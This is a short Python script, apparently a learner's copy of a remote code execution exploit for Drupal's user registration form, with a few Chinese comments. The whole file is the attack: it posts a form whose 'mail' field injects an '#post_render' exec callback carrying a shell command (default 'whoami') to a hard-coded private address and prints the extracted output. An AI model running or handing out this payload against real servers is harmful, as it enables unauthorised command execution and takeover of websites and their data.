import click
import requests
import re

# url='http://192.168.10.52:8080'
# cmd='id'
def exp(target,command):
    payload='/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    data={'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command}
    headers={
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    res =requests.post(target+payload,data=data,verify=False,headers=headers) #加载payload
    r =re.findall(r'"data":"(.*?)u00',res.text) ## 这句话是干嘛的？
    print(r)
# @click.command()
# @click.option("-i", help='Target ip', type=str)
# @click.option("-p", help='Target port', type=str)
# @click.option("-c", help="Commands to be executed; ", type=str)

i = '192.168.126.137'
p = '8080'
c = 'whoami'

def main(i, p,c):
    res = requests.get('http://'+i+':'+p,verify=False)
    if res.status_code==200:
        url = 'http://'+i+':'+p
    else:url='https://'+i+':'+p

    exp(url, c)

if __name__ == "__main__":
    main(i,p,c)

